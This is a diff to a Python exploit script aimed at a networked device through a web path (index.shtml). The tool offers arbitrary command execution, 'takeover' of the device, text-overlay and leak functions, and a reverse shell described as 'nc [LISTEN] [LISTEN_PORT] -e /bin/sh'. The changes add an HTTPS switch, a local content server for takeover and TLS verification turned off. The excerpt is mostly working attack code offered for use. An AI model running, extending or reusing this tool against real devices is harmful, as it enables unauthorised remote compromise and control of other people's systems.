@@ -42,11 +42,12 @@ parser.add_argument("-olc", "--overlay-leak-command", type=str, help="Optional l
 parser.add_argument("-r",   "--reverse", action="store_true", help="Request reverse shell from target (nc [LISTEN] [LISTEN_PORT] -e /bin/sh)")
 parser.add_argument("-e",   "--execute", type=str, help="Execute command (OVERRIDES --reverse)")
 parser.add_argument("--takeover", action="store_true", help="Takeover device (OVERRIDES --reverse and --execute) *requires takeover.py")
+parser.add_argument("-w", "--webserve", action="store_true", help="Serve content for --takeover locally on LISTEN_PORT")
 
 # Special Connection arguments
 parser.add_argument("-f",   "--target-path", type=str, help="Target file path", default="index.shtml")
 parser.add_argument("-p",   "--proxy", type=str, help="Proxy to send requests in URL form 'http://IPADDRESS:PORT' (optional)")
-# parser.add_argument("-s",   "--https", action="store_true", help="HTTPS")
+parser.add_argument("-s",   "--ssl", action="store_true", help="HTTPS")
 
 args = parser.parse_args()
 
@@ -83,8 +84,8 @@ if (args.listen_port != None):
 if (args.target_path != None):
     target_file = args.target_path
 
-# if (args.https):
-#     target_proto = "https"
+if (args.ssl):
+    target_proto = "https"
 
 if (args.overlay_text != None and args.overlay_leak):
     logging(f"Cannot use --overlay-text (Overlay text) and --overlay-leak (Leak) simutaneously.\n")
@@ -184,7 +185,7 @@ def test_connect():
     }
     
     logging(f"+ Testing connection to device...\t\t\t\t")
-    if http_check(requests.post(f"{target_url}", data=TEST_DATA, proxies=req_proxy, allow_redirects=False), True):
+    if http_check(requests.post(f"{target_url}", data=TEST_DATA, proxies=req_proxy, allow_redirects=False, verify=False), True):
         exit(1)
 
 
@@ -193,7 +194,7 @@ def test_connect():
 """
 # Send request
 def send_req(req_data: dict):
-    if http_check(requests.post(f"{target_url}", data=req_data, proxies=req_proxy, allow_redirects=False)):
+    if http_check(requests.post(f"{target_url}", data=req_data, proxies=req_proxy, allow_redirects=False, verify=False)):
         exit(1)
 
 
@@ -285,7 +286,7 @@ def overlay_leak():
 def dst_command_req():
     global stage
     
-    if (args.takeover):
+    if (args.webserve):
         import threading
         http_srv_thread = threading.Thread(target=takeover.run_server, args=(listen_port,))
         logging("+ Starting content server (will run until QUIT is received from target)\n")
@@ -304,7 +305,7 @@ def dst_command_req():
     sync_req()
     dst_reset_req()
 
-    if (args.takeover):
+    if (args.webserve):
         while (takeover.srv_run):
             sleep(1)
         logging("+ QUIT received. Stopping content server\n")
@@ -332,7 +333,7 @@ def main():
     if (args.takeover) or (args.reverse) or (args.execute != None):
         if (not args.quiet):
             if (not args.takeover) and (not args.auto):
-                input("= Start listener and press Enter to continue...")
+                input("= Start listener if needed and press Enter to continue...")
         dst_command_req()
     
 
